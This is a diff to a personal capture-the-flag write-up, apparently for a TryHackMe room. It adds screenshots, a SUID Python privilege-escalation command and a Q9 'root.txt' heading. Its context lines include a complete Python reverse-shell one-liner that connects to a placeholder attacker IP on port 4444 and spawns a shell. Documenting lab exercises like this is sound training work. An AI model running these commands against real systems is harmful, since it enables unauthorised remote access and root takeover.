@@ -84,7 +84,13 @@ For this one i use gtfobins (https://gtfobins.org/#//^suid$)
 
 With the python privesc methon i ended up using this command `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'` and the ip addres that it's in (https://tryhackme.com/manage-account/access) under openvpn as my ip
 
+![](../Img/Pasted%20image%2020260314174141.png)
 
-## Q9: 
+After that i used `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` for privesc
+
+![](../Img/Pasted%20image%2020260314174156.png)
+
+---
+## Q9: root.txt 
 ### A: 
 
